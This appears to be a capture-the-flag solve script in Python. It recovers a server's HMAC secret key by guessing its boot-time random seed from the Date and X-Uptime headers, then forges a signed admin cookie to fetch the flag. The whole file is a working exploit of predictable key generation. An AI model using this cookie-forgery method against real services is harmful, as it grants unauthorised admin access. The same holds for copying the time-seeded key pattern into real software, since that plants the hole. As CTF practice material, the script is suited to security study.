#!/usr/bin/env python3.8
import requests
from datetime import *
from email.utils import parsedate_to_datetime
import time
import random
import string
import hashlib
import hmac

def get_random_string(length):
  letters = string.ascii_lowercase
  result_str = ''.join(random.choice(letters) for i in range(length))
  return result_str

def sign(text, key):
  textAsBytes = bytes(text, encoding='ascii')
  keyAsBytes  = bytes(key, encoding='ascii')
  signature = hmac.new(keyAsBytes, textAsBytes, hashlib.sha256)
  return signature.hexdigest()

def verify(text, signature, key):
  expected_signature = sign(text, key)
  return hmac.compare_digest(expected_signature, signature)

url = "http://trulyrandomsignature.challs.olicyber.it/"

r = requests.get(url)
curr_time = datetime.strptime(r.headers["Date"], "%a, %d %b %Y %X %Z")

for delta in range(-10, 10):
    boot_time = curr_time - timedelta(seconds=int(r.headers["X-Uptime"]) + delta)
    seed = boot_time.strftime('%Y-%m-%d %H:%M:%S')
    random.seed(seed)
    SUPER_SECRET_KEY = get_random_string(32)

    cookies = {"user": "admin", "signature": sign("admin", SUPER_SECRET_KEY)}
    flag_resp = requests.get(url + "admin", cookies=cookies)
    
    if "flag" in flag_resp.text:
      print(flag_resp.text)
      break